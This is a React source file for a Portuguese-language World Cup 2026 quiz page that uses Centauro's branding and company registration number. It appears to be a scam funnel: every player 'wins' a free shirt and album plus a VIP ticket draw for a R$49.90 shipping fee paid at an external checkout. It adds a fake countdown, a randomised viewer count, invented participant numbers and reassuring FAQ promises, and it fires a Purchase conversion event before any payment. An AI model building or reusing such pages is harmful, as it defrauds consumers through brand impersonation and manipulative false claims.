import { useState, useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import CentauroHeader from '@/components/CentauroHeader';
import LoadingAnimation from '@/components/LoadingAnimation';
import { CheckCircle, Trophy, Truck, Shield, Clock, Users, Gift, ShoppingCart, Star, Ticket, Plane, MapPin } from 'lucide-react';
import { trackEvent } from '@/lib/funnelTracking';
import { fireConversionEvent } from '@/lib/pixelManager';
import { fireSaleWebhook } from '@/lib/webhookManager';
import camisaImg from '@/assets/camisa-brasil-hero.png';
import albumImg from '@/assets/album-copa-hero.png';
import centauroLogo from '@/assets/centauro-logo.png';
import stadiumHero from '@/assets/stadium-hero.jpg';
import centauroWorldcupLogo from '@/assets/centauro-worldcup-logo.png';
import worldcupTrophy from '@/assets/worldcup-trophy.png';
import { Mail, Phone, MapPin as MapPinIcon } from 'lucide-react';

interface Question {
  id: number;
  question: string;
  options: string[];
  correctAnswer: number;
}

const quizQuestions: Question[] = [
  {
    id: 1,
    question: 'Quantas vezes o Brasil ganhou a Copa do Mundo?',
    options: ['3 vezes', '4 vezes', '5 vezes', '6 vezes'],
    correctAnswer: 2,
  },
  {
    id: 2,
    question: 'Em que ano o Brasil venceu sua primeira Copa do Mundo?',
    options: ['1950', '1958', '1962', '1970'],
    correctAnswer: 1,
  },
  {
    id: 3,
    question: 'Qual jogador é o maior artilheiro da Seleção em Copas?',
    options: ['Ronaldo Fenômeno', 'Pelé', 'Ronaldinho', 'Neymar'],
    correctAnswer: 0,
  },
  {
    id: 4,
    question: 'Neymar joga com qual número na Seleção?',
    options: ['7', '10', '11', '9'],
    correctAnswer: 1,
  },
  {
    id: 5,
    question: 'Quantos gols Pelé marcou pela Seleção Brasileira?',
    options: ['70 gols', '77 gols', '85 gols', '90 gols'],
    correctAnswer: 1,
  },
  {
    id: 6,
    question: 'Qual seleção é a maior rival do Brasil em Copas?',
    options: ['Itália', 'Alemanha', 'Argentina', 'França'],
    correctAnswer: 2,
  },
  {
    id: 7,
    question: 'Qual país sediará a Copa do Mundo 2026?',
    options: ['Brasil', 'Argentina', 'EUA, México e Canadá', 'Austrália'],
    correctAnswer: 2,
  },
  {
    id: 8,
    question: 'Quantas Copas do Mundo Ronaldo Fenômeno disputou?',
    options: ['2 Copas', '3 Copas', '4 Copas', '5 Copas'],
    correctAnswer: 2,
  },
];

export default function QuizHome() {
  const [showHome, setShowHome] = useState(true);
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [showResult, setShowResult] = useState(false);
  const [quizComplete, setQuizComplete] = useState(false);
  const [selectedAnswer, setSelectedAnswer] = useState<number | null>(null);
  const [isCorrect, setIsCorrect] = useState(false);
  const [showAnimation, setShowAnimation] = useState(false);
  const [timeLeft, setTimeLeft] = useState(300);
  const [selectedSize, setSelectedSize] = useState('M');
  const [viewersCount] = useState(Math.floor(Math.random() * 30) + 38);
  const hasTrackedVisitor = useRef(false);
  const hasTrackedQuizStart = useRef(false);
  const hasTrackedQuizComplete = useRef(false);
  const hasTrackedCheckout = useRef(false);

  // Track visitor on mount
  useEffect(() => {
    if (!hasTrackedVisitor.current) {
      trackEvent('visitor');
      hasTrackedVisitor.current = true;
    }
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
  };

  const handleAnswerClick = (index: number) => {
    if (selectedAnswer !== null) return;
    setSelectedAnswer(index);
    setShowResult(true);
    setIsCorrect(index === quizQuestions[currentQuestion].correctAnswer);
    
    // Auto-advance after 1 second
    setTimeout(() => {
      if (currentQuestion < quizQuestions.length - 1) {
        setCurrentQuestion(prev => prev + 1);
        setSelectedAnswer(null);
        setShowResult(false);
        setIsCorrect(false);
      } else {
        if (!hasTrackedQuizComplete.current) { trackEvent('quiz_completed'); hasTrackedQuizComplete.current = true; } setShowAnimation(true);
      }
    }, 1000);
  };

  const handleNextQuestion = () => {
    if (currentQuestion < quizQuestions.length - 1) {
      setCurrentQuestion(prev => prev + 1);
      setSelectedAnswer(null);
      setShowResult(false);
      setIsCorrect(false);
    } else {
      if (!hasTrackedQuizComplete.current) { trackEvent('quiz_completed'); hasTrackedQuizComplete.current = true; } setShowAnimation(true);
    }
  };

  const handleGoToCheckout = () => {
    if (!hasTrackedCheckout.current) {
      trackEvent('checkout');
      fireConversionEvent('Purchase', { value: 49.90, currency: 'BRL' });
      fireSaleWebhook({ source: 'quiz-copa-2026' });
      hasTrackedCheckout.current = true;
    }
    const checkoutUrl = localStorage.getItem('checkoutUrl') || 'https://seu-checkout.com/taxa-envio';
    window.location.href = checkoutUrl;
  };

  // HOME / LANDING PAGE
  if (showHome) {
    return (
      <div className="min-h-screen bg-foreground flex flex-col">
        {/* Centauro Top Bar */}
        <div className="bg-primary py-2.5 px-4">
          <div className="max-w-4xl mx-auto flex items-center justify-center gap-3">
            <img src={centauroLogo} alt="Centauro" className="h-8 md:h-12 object-contain brightness-0 invert" />
            <span className="text-primary-foreground text-xl font-light opacity-40">×</span>
            <img src={worldcupTrophy} alt="FIFA World Cup 2026" className="h-8 md:h-12 object-contain" />
          </div>
        </div>

        {/* Full-screen Hero */}
        <div
          className="relative flex-1 flex flex-col items-center justify-center text-center px-5 py-16 md:py-24"
          style={{
            backgroundImage: `url(${stadiumHero})`,
            backgroundSize: 'cover',
            backgroundPosition: 'center',
          }}
        >
          <div className="absolute inset-0 bg-gradient-to-b from-foreground/70 via-foreground/85 to-foreground/95" />
          <div className="relative z-10 max-w-lg mx-auto flex flex-col items-center">

            <h1 className="text-3xl md:text-5xl font-black text-primary-foreground leading-[1.1] mb-4 tracking-tight">
              Você conhece a Seleção Brasileira?
            </h1>

            <p className="text-sm md:text-lg text-primary-foreground/70 mb-8 leading-relaxed max-w-md">
              Responda 8 perguntas rápidas e concorra a prêmios exclusivos da Copa 2026
            </p>

            <Button
              onClick={() => { if (!hasTrackedQuizStart.current) { trackEvent('quiz_started'); hasTrackedQuizStart.current = true; } setShowHome(false); }}
              className="bg-centauro-green hover:bg-centauro-green/80 text-primary-foreground font-black text-lg md:text-xl px-14 py-7 rounded-lg transition-transform hover:scale-105 active:scale-95 uppercase tracking-wider w-full max-w-sm"
              style={{ boxShadow: '0 8px 30px hsl(145 63% 42% / 0.5)' }}
            >
              COMEÇAR QUIZ
            </Button>

            <p className="text-primary-foreground/30 text-[11px] mt-3 font-semibold">Gratuito · Menos de 2 minutos · Sem cadastro</p>

            {/* Minimal social proof */}
            <div className="flex items-center gap-1.5 mt-6 text-primary-foreground/40 text-[11px] font-bold">
              <Users size={12} className="text-centauro-green/70" />
              <span>2.847 pessoas já participaram</span>
            </div>
          </div>
        </div>

        {/* Minimal footer */}
        <footer className="bg-foreground border-t border-primary-foreground/5 py-4 px-4">
          <div className="max-w-lg mx-auto text-center">
            <img src={centauroLogo} alt="Centauro" className="h-4 mx-auto mb-2 opacity-15 brightness-0 invert" />
            <p className="text-primary-foreground/20 text-[9px]">
              © 2026 Centauro Esportes S.A. · CNPJ 06.347.409/0001-90 · Todos os direitos reservados
            </p>
          </div>
        </footer>
      </div>
    );
  }

  if (showAnimation) {
    return <LoadingAnimation onComplete={() => { setShowAnimation(false); setQuizComplete(true); }} />;
  }

  if (quizComplete) {
    return (
      <div className="min-h-screen bg-background">
        {/* Centauro Top Bar */}
        <div className="bg-primary py-3 px-4">
          <div className="max-w-4xl mx-auto flex items-center justify-center">
            <img src={centauroLogo} alt="Centauro" className="h-16 md:h-20 object-contain brightness-0 invert" />
          </div>
        </div>

        {/* Urgency Bar */}
        <div className="bg-foreground text-primary-foreground py-2.5">
          <div className="max-w-4xl mx-auto px-4 flex items-center justify-center gap-6 text-xs font-bold">
            <div className="flex items-center gap-2">
              <Clock size={14} className="text-primary" />
              <span>Oferta expira em:</span>
              <span className="text-primary animate-countdown font-mono">{formatTime(timeLeft)}</span>
            </div>
            <div className="hidden md:flex items-center gap-2">
              <Users size={14} className="text-centauro-gold" />
              <span>{viewersCount} pessoas vendo agora</span>
            </div>
          </div>
        </div>

        {/* Victory */}
        <div className="bg-primary py-14 text-center relative overflow-hidden">
          <div className="absolute inset-0 opacity-5">
            <div className="absolute inset-0" style={{ backgroundImage: 'repeating-linear-gradient(45deg, transparent, transparent 20px, rgba(255,255,255,0.1) 20px, rgba(255,255,255,0.1) 40px)' }} />
          </div>
          <Trophy className="w-16 h-16 text-centauro-gold mx-auto mb-3" />
          <h1 className="text-4xl md:text-5xl font-black text-primary-foreground mb-2 tracking-tight">
            PARABÉNS!
          </h1>
          <p className="text-lg font-semibold text-primary-foreground/90">
            Você desbloqueou seus prêmios exclusivos!
          </p>
        </div>

        {/* Contest Banner - 2 Ingressos Copa */}
        <div className="bg-centauro-gold text-foreground py-0">
          <div className="max-w-4xl mx-auto px-4 py-6 md:py-8">
            <div className="flex flex-col md:flex-row items-center gap-4 md:gap-8">
              <div className="flex items-center gap-3 shrink-0">
                <div className="w-14 h-14 bg-foreground rounded-full flex items-center justify-center">
                  <Ticket className="w-7 h-7 text-centauro-gold" />
                </div>
              </div>
              <div className="text-center md:text-left flex-1">
                <p className="text-[10px] font-bold tracking-[0.2em] uppercase opacity-70 mb-1">Bônus Exclusivo</p>
                <h3 className="text-xl md:text-2xl font-black tracking-tight mb-1">
                  CONCORRA A 2 INGRESSOS PARA A COPA 2026!
                </h3>
                <p className="text-sm font-semibold opacity-80">
                  Ao garantir seus prêmios, você automaticamente concorre a <strong>2 ingressos VIP</strong> para assistir a Copa do Mundo 2026 com <strong>tudo pago</strong>!
                </p>
              </div>
            </div>
            <div className="grid grid-cols-3 gap-3 mt-5">
              <div className="bg-foreground/10 rounded-md p-3 text-center">
                <Plane className="w-5 h-5 mx-auto mb-1 opacity-80" />
                <p className="text-[10px] font-bold">Passagem Aérea</p>
                <p className="text-[9px] opacity-70">Ida e Volta</p>
              </div>
              <div className="bg-foreground/10 rounded-md p-3 text-center">
                <MapPin className="w-5 h-5 mx-auto mb-1 opacity-80" />
                <p className="text-[10px] font-bold">Hospedagem</p>
                <p className="text-[9px] opacity-70">Hotel 5 Estrelas</p>
              </div>
              <div className="bg-foreground/10 rounded-md p-3 text-center">
                <Ticket className="w-5 h-5 mx-auto mb-1 opacity-80" />
                <p className="text-[10px] font-bold">2 Ingressos VIP</p>
                <p className="text-[9px] opacity-70">Jogo do Brasil</p>
              </div>
            </div>
          </div>
        </div>

        <div className="max-w-4xl mx-auto px-4 py-10">
          {/* Products */}
          <div className="flex items-center gap-2 mb-6">
            <div className="h-0.5 flex-1 bg-primary" />
            <h2 className="text-xl font-black text-foreground px-4 tracking-tight uppercase">Seus Prêmios</h2>
            <div className="h-0.5 flex-1 bg-primary" />
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-5 mb-10">
            {/* Camisa */}
            <Card className="overflow-hidden border border-border shadow-sm hover:shadow-md transition-shadow">
              <div className="relative bg-secondary p-6 flex items-center justify-center h-56">
                <span className="absolute top-3 left-3 bg-primary text-primary-foreground text-[10px] font-bold px-2.5 py-1 rounded uppercase tracking-wider">
                  Exclusivo
                </span>
                <img src={camisaImg} alt="Camisa Brasil 2026" className="max-h-44 object-contain" />
              </div>
              <div className="p-5">
                <h3 className="text-lg font-black text-foreground mb-0.5">Camisa Brasil 2026</h3>
                <p className="text-muted-foreground text-xs mb-3">Seleção Brasileira - Edição Copa do Mundo</p>
                <div className="mb-3">
                  <p className="text-xs font-bold text-foreground mb-2">Tamanho:</p>
                  <div className="flex gap-2">
                    {['P', 'M', 'G', 'GG', 'XG', 'XXG'].map((size) => (
                      <button
                        key={size}
                        onClick={() => setSelectedSize(size)}
                        className={`w-10 h-10 rounded-md text-xs font-black border-2 transition-all ${
                          selectedSize === size
                            ? 'bg-primary text-primary-foreground border-primary'
                            : 'bg-secondary text-foreground border-border hover:border-primary/50'
                        }`}
                      >
                        {size}
                      </button>
                    ))}
                  </div>
                </div>
                <ul className="space-y-1.5 text-xs mb-4">
                  {['Qualidade Premium', 'Bordado Oficial CBF'].map((item) => (
                    <li key={item} className="flex items-center gap-2 text-foreground">
                      <CheckCircle size={12} className="text-centauro-green shrink-0" /> {item}
                    </li>
                  ))}
                </ul>
                <div className="flex items-center gap-2 pt-3 border-t border-border">
                  <span className="text-muted-foreground line-through text-xs">R$ 249,90</span>
                  <span className="bg-centauro-green/10 text-centauro-green font-black text-sm px-2 py-0.5 rounded">GRÁTIS</span>
                </div>
              </div>
            </Card>

            {/* Álbum */}
            <Card className="overflow-hidden border border-border shadow-sm hover:shadow-md transition-shadow">
              <div className="relative bg-secondary p-6 flex items-center justify-center h-56">
                <span className="absolute top-3 left-3 bg-primary text-primary-foreground text-[10px] font-bold px-2.5 py-1 rounded uppercase tracking-wider">
                  Exclusivo
                </span>
                <img src={albumImg} alt="Álbum Copa 2026" className="max-h-44 object-contain" />
              </div>
              <div className="p-5">
                <h3 className="text-lg font-black text-foreground mb-0.5">Álbum Copa 2026</h3>
                <p className="text-muted-foreground text-xs mb-3">Panini + 50 Pacotes de Figurinhas</p>
                <ul className="space-y-1.5 text-xs mb-4">
                  {['140+ packs de figurinhas', 'Edição Limitada FIFA', 'Figurinhas Exclusivas'].map((item) => (
                    <li key={item} className="flex items-center gap-2 text-foreground">
                      <CheckCircle size={12} className="text-centauro-green shrink-0" /> {item}
                    </li>
                  ))}
                </ul>
                <div className="flex items-center gap-2 pt-3 border-t border-border">
                  <span className="text-muted-foreground line-through text-xs">R$ 189,90</span>
                  <span className="bg-centauro-green/10 text-centauro-green font-black text-sm px-2 py-0.5 rounded">GRÁTIS</span>
                </div>
              </div>
            </Card>
          </div>

          {/* Order Summary */}
          <Card className="p-6 mb-8 border border-border shadow-sm">
            <h3 className="text-lg font-black text-foreground mb-5 text-center uppercase tracking-tight">
              Resumo do Pedido
            </h3>
            <div className="space-y-2.5 mb-5">
              <div className="flex items-center justify-between p-3.5 bg-secondary rounded-md">
                <div>
                  <p className="font-bold text-foreground text-sm">Camisa Oficial Brasil 2026</p>
                  <p className="text-xs text-muted-foreground">Valor original: R$ 249,90</p>
                </div>
                <p className="font-black text-centauro-green text-sm">GRÁTIS</p>
              </div>
              <div className="flex items-center justify-between p-3.5 bg-secondary rounded-md">
                <div>
                  <p className="font-bold text-foreground text-sm">Álbum Copa 2026 + 50 Packs</p>
                  <p className="text-xs text-muted-foreground">Valor original: R$ 189,90</p>
                </div>
                <p className="font-black text-centauro-green text-sm">GRÁTIS</p>
              </div>
              <div className="border-t border-border" />
              <div className="flex items-center justify-between p-3.5 bg-centauro-gold/10 rounded-md border border-centauro-gold/30">
                <div>
                  <p className="font-bold text-foreground text-sm flex items-center gap-1.5">
                    <Ticket size={14} className="text-centauro-gold" /> Sorteio 2 Ingressos VIP Copa
                  </p>
                  <p className="text-xs text-muted-foreground">Passagem + Hotel + Ingressos</p>
                </div>
                <p className="font-black text-centauro-gold text-sm">INCLUSO</p>
              </div>
              <div className="border-t border-border" />
              <div className="flex items-center justify-between p-3.5 bg-primary/5 rounded-md border border-primary/20">
                <div>
                  <p className="font-bold text-foreground text-sm">Taxa de Envio</p>
                  <p className="text-xs text-muted-foreground">Entrega em 3-5 dias úteis</p>
                </div>
                <p className="font-black text-centauro-green text-lg">R$ 49,90</p>
              </div>
            </div>
            <div className="bg-secondary p-5 rounded-md text-center">
              <p className="text-muted-foreground text-xs font-medium mb-1">Economia total</p>
              <p className="text-3xl font-black text-foreground mb-0.5">R$ 370,00</p>
              <p className="text-sm font-bold text-centauro-green">de desconto nos seus prêmios!</p>
            </div>
          </Card>

          {/* CTA */}
          <div className="bg-primary rounded-xl p-8 md:p-10 text-center mb-8 relative overflow-hidden">
            <div className="absolute inset-0 opacity-5">
              <div className="absolute inset-0" style={{ backgroundImage: 'repeating-linear-gradient(45deg, transparent, transparent 20px, rgba(255,255,255,0.15) 20px, rgba(255,255,255,0.15) 40px)' }} />
            </div>
            <div className="relative z-10">
              <ShoppingCart className="w-10 h-10 text-primary-foreground mx-auto mb-3 opacity-80" />
              <p className="text-primary-foreground/60 text-xs font-bold tracking-[0.2em] uppercase mb-2">
                Último Passo
              </p>
              <h3 className="text-3xl md:text-4xl font-black text-primary-foreground mb-2 tracking-tight">
                PAGUE APENAS O FRETE
              </h3>
              <p className="text-primary-foreground/70 text-xs font-semibold mb-6 max-w-sm mx-auto">
                E concorra automaticamente a <span className="text-centauro-gold font-black">2 ingressos VIP</span> para a Copa 2026 com tudo pago!
              </p>
              <div className="bg-centauro-green rounded-lg p-5 mb-6 max-w-xs mx-auto">
                <p className="text-primary-foreground text-xs font-bold mb-1 opacity-80">VALOR DO FRETE</p>
                <p className="text-primary-foreground text-5xl font-black">R$ 49,90</p>
                <p className="text-primary-foreground text-xs font-medium mt-1 opacity-80">Entrega em todo Brasil</p>
              </div>
              <Button
                onClick={handleGoToCheckout}
                className="w-full max-w-sm bg-centauro-green hover:bg-centauro-green/80 text-primary-foreground font-black text-base py-6 rounded-lg transition-transform hover:scale-[1.02] active:scale-95"
                style={{ boxShadow: '0 6px 25px hsl(145 63% 42% / 0.5)' }}
              >
                PAGAR FRETE AGORA
              </Button>
              <div className="flex items-center justify-center gap-1.5 mt-4">
                <Ticket size={12} className="text-centauro-gold" />
                <p className="text-centauro-gold text-xs font-bold">
                  + Sorteio de 2 Ingressos VIP Copa 2026
                </p>
              </div>
              <p className="text-primary-foreground/40 text-[10px] font-medium mt-2">
                ⏰ Oferta válida por {formatTime(timeLeft)}
              </p>
            </div>
          </div>

          {/* Trust badges */}
          <div className="grid grid-cols-3 gap-3 mb-8">
            {[
              { icon: CheckCircle, color: 'text-centauro-green', title: 'Garantido', desc: 'Todos ganham' },
              { icon: Truck, color: 'text-primary', title: 'Entrega', desc: '3-5 dias úteis' },
              { icon: Shield, color: 'text-foreground', title: 'Seguro', desc: 'Compra protegida' },
            ].map(({ icon: Icon, color, title, desc }) => (
              <div key={title} className="bg-card p-3.5 rounded-lg border border-border text-center">
                <Icon className={`${color} mx-auto mb-1.5`} size={20} />
                <h4 className="font-bold text-foreground text-xs">{title}</h4>
                <p className="text-[10px] text-muted-foreground">{desc}</p>
              </div>
            ))}
          </div>

          {/* FAQ */}
          <Card className="p-5 md:p-6 border border-border shadow-sm mb-8">
            <h3 className="text-base font-black text-foreground mb-4 text-center uppercase tracking-tight">
              Perguntas Frequentes
            </h3>
            <div className="space-y-2.5">
              {[
                { q: 'Como funciona a entrega?', a: 'Após confirmar, você recebe um email com rastreamento. Entrega em 3-5 dias úteis.' },
                { q: 'Posso devolver?', a: 'Sim! Garantia de 30 dias. Devolvemos seu dinheiro sem perguntas.' },
                { q: 'Meus dados estão seguros?', a: '100% seguro! SSL 256-bit. Nunca compartilhamos seus dados.' },
                { q: 'Preciso de suporte?', a: 'Suporte 24/7 via WhatsApp, Email e Chat.' },
              ].map((faq, i) => (
                <div key={i} className="bg-secondary p-3.5 rounded-md">
                  <p className="font-bold text-foreground text-xs mb-0.5">{faq.q}</p>
                  <p className="text-[11px] text-muted-foreground leading-relaxed">{faq.a}</p>
                </div>
              ))}
            </div>
          </Card>

          {/* Footer */}
          <div className="text-center py-6">
            <img src={centauroLogo} alt="Centauro" className="h-6 mx-auto mb-3 opacity-30" />
            <p className="text-muted-foreground text-[10px]">
              © 2026 Centauro Esportes. Todos os direitos reservados.
            </p>
            <p className="text-muted-foreground text-[10px] mt-0.5">
              Promoção válida enquanto durar o estoque.
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Quiz screen
  const question = quizQuestions[currentQuestion];
  if (!question) return null;
  const progressPercent = ((currentQuestion + 1) / quizQuestions.length) * 100;

  return (
    <div className="min-h-screen bg-background">
      <CentauroHeader />

      <div className="max-w-xl mx-auto px-4 py-8">
        {/* Progress */}
        <div className="mb-6">
          <div className="flex justify-between items-center mb-2">
            <span className="text-xs font-bold text-muted-foreground">
              Pergunta {currentQuestion + 1}/{quizQuestions.length}
            </span>
            <span className="text-xs font-bold text-primary">
              {Math.round(progressPercent)}%
            </span>
          </div>
          <div className="w-full bg-secondary rounded-full h-2 overflow-hidden">
            <div
              className="h-full bg-primary rounded-full transition-all duration-500"
              style={{ width: `${progressPercent}%` }}
            />
          </div>
        </div>

        {/* Question Card */}
        <Card className="p-5 md:p-7 border border-border shadow-sm mb-5">
          <h2 className="text-xl md:text-2xl font-black text-foreground mb-6 leading-tight">
            {question.question}
          </h2>
          <div className="space-y-2.5">
            {question.options.map((option, index) => {
              const isSelected = selectedAnswer === index;
              const isCorrectAnswer = index === question.correctAnswer;
              let btnClass = 'w-full p-3.5 text-left font-semibold rounded-md transition-all duration-200 border text-sm ';

              if (selectedAnswer === null) {
                btnClass += 'bg-card border-border hover:border-primary hover:bg-primary/5 cursor-pointer';
              } else if (isSelected) {
                btnClass += isCorrect
                  ? 'bg-centauro-green/10 border-centauro-green text-centauro-green'
                  : 'bg-destructive/10 border-destructive text-destructive';
              } else if (isCorrectAnswer) {
                btnClass += 'bg-centauro-green/10 border-centauro-green text-centauro-green';
              } else {
                btnClass += 'bg-secondary border-border text-muted-foreground';
              }

              return (
                <button
                  key={index}
                  onClick={() => handleAnswerClick(index)}
                  disabled={selectedAnswer !== null}
                  className={btnClass}
                >
                  <span className="flex items-center">
                    <span className="inline-flex items-center justify-center w-7 h-7 rounded bg-primary text-primary-foreground font-black mr-3 text-xs">
                      {String.fromCharCode(65 + index)}
                    </span>
                    {option}
                  </span>
                </button>
              );
            })}
          </div>
        </Card>

        {/* Feedback */}
        {showResult && (
          <div className={`p-3.5 rounded-md text-center font-bold mb-5 text-sm border ${
            isCorrect
              ? 'bg-centauro-green/10 border-centauro-green text-centauro-green'
              : 'bg-destructive/10 border-destructive text-destructive'
          }`}>
            {isCorrect ? '✓ Correto! Muito bem!' : '✗ Não foi dessa vez!'}
          </div>
        )}

        {/* Next Button */}
        {showResult && (
          <div className="flex justify-center">
            <Button
              onClick={handleNextQuestion}
              className="bg-centauro-green hover:bg-centauro-green/90 text-primary-foreground font-black text-sm px-8 py-5 rounded-md transition-transform hover:scale-[1.02]"
            >
              {currentQuestion === quizQuestions.length - 1 ? '🏆 VER MEUS PRÊMIOS' : 'PRÓXIMA →'}
            </Button>
          </div>
        )}

        {/* Prize preview */}
        <div className="mt-8 bg-primary/5 rounded-md p-3.5 border border-primary/15">
          <div className="flex flex-col items-center gap-1.5">
            <div className="flex items-center gap-2">
              <Gift size={16} className="text-primary" />
              <p className="text-xs font-bold text-foreground">
                Prêmio: <span className="text-primary">Camisa Brasil + Álbum Copa 2026</span>
              </p>
            </div>
            <div className="flex items-center gap-1.5">
              <Ticket size={13} className="text-centauro-gold" />
              <p className="text-[10px] font-bold text-centauro-gold">
                + Concorra a 2 ingressos VIP para a Copa 2026!
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
